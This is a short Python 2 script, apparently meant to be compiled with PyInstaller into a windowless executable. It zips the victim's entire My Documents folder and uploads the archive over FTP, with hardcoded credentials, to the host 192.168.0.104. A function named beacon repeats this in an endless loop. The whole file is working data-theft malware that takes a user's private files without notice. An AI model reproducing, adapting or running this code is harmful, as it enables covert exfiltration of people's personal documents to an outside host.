#!/usr/bin/env python
#compiled with py installer
#pyinstaller -F -w --icon=dragon.ico uploader***.py



import ftplib
from ftplib import FTP
import os
import time
import zipfile
import socket


def ftpupload():
	time.sleep(5)
	hostname = socket.gethostname()
	zfile = "c:\\" + hostname + ".zip"
	try:
		ftp = FTP('192.168.0.104', "azod","azodisking")
		ftp.storlines(str("STOR " + hostname + ".zip"), open(zfile, 'r'))
        
	except Exception, e:  #you can specify type of Exception also
		print str(e)

def zipdir(path, zip):
    for root, dirs, files in os.walk(path):
        for file in files:
            zip.write(os.path.join(root,file))

def zipitup():
	hostname = socket.gethostname()
	zfile = str("C:\\" + hostname + ".zip")
	zipf = zipfile.ZipFile(zfile, 'w')
	zipdir(os.path.expanduser('~\\My Documents'), zipf)
	zipf.close()

def beacon():
	count =1
	while count > 0:
		zipitup()
		ftpupload()

beacon()